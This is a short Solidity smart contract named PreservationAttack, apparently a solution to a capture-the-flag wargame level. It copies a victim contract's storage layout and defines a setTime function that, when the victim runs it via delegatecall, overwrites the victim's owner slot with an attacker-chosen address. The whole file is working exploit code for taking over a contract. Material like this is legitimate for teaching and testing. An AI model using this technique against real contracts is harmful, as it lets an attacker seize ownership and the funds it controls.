// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

contract PreservationAttack {
    address public dummy1; // timeZone1Library;
    address public dummy2; // timeZone2Library;
    address public owner;
    function setTime(uint256 _newOwner) public {
        // when called via delegatecall, this will overwrite the third storage slot in the calling contract
        owner = address(uint160(_newOwner));
    }
}